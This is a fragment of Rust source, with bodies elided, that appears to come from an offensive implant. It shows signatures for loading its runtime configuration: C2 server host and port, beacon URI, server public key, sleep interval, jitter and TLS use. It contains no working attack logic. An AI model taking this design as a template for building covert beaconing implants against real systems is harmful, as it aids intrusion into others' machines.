...
pub fn load_runtime_config() -> Option<(nyx_implant_core::config::Config, ImplantConfig, Vec<u8>)> {
...
fn load_runtime_config_assemble(
    ...
    keying_levels: u32,
    plaintext: Vec<u8>,
) -> (nyx_implant_core::config::Config, ImplantConfig, Vec<u8>) {
    let (
        server_host,
        server_port,
        beacon_uri,
...
fn load_runtime_config_build_cfg(
    server_host: nyx_implant_core::heap::String,
    server_port: u16,
    beacon_uri: nyx_implant_core::heap::String,
    server_pub: [u8; 32],
    sleep_seconds: u32,
    jitter_pct: u8,
    use_tls: bool,
